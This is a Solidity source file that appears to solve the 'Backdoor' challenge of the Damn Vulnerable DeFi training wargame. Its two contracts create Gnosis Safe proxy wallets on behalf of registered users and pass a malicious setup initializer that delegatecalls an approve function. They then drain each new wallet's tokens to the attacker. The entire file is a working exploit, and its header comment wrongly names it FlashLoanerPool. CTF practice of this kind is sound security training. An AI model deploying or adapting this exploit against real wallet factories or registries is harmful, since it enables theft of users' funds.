// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @dev A simple pool to get flashloans of DVT
 */
import "./WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract BackdoorAttackerInvoker {
    constructor(
        address _proxyFactory,
        address _masterSafe,
        address _registry,
        address[] memory users,
        address attackToken,
        uint attackAmount
    ) {
        BackdoorAttacker attacker = new BackdoorAttacker(
            msg.sender,
            _proxyFactory,
            _masterSafe,
            _registry
        );
        attacker.attack(users, attackToken, attackAmount);
    }
}

contract BackdoorAttacker {
    address immutable owner;
    address private masterSafe;
    IProxyCreationCallback private registry;
    address private proxyFactory;
    address immutable original;

    constructor(
        address _owner,
        address _proxyFactory,
        address _masterSafe,
        address _registry
    ) {
        owner = _owner;
        masterSafe = _masterSafe;
        registry = IProxyCreationCallback(_registry);
        proxyFactory = _proxyFactory;
        original = address(this);
    }

    function attack(
        address[] memory users,
        address attackToken,
        uint attackAmount
    ) public {
        for (uint i = 0; i < users.length; i++) {
            bytes
                memory maliciousInitializer = createMaliciousInitializerForUser(
                    users[i],
                    attackToken,
                    attackAmount
                );
            uint salt = i;
            address createdProxy = createProxySafe(
                masterSafe,
                maliciousInitializer,
                salt,
                registry
            );
            IERC20(attackToken).transferFrom(createdProxy, owner, attackAmount);
        }
    }

    function createMaliciousInitializerForUser(
        address user,
        address token,
        uint amount
    ) internal view returns (bytes memory) {
        address[] memory owners = new address[](1);
        owners[0] = user;
        bytes memory attackData = abi.encodeWithSignature(
            "attackForERC20(address,uint256)",
            token,
            amount
        );
        return
            abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                attackData,
                0,
                0,
                0,
                0
            );
    }

    function createProxySafe(
        address masterCopy,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) internal returns (address createdProxy) {
        createdProxy = address(
            GnosisSafeProxyFactory(proxyFactory).createProxyWithCallback(
                masterCopy,
                initializer,
                saltNonce,
                callback
            )
        );
    }

    function attackForERC20(address token, uint amount) public {
        IERC20(token).approve(original, amount);
    }
}
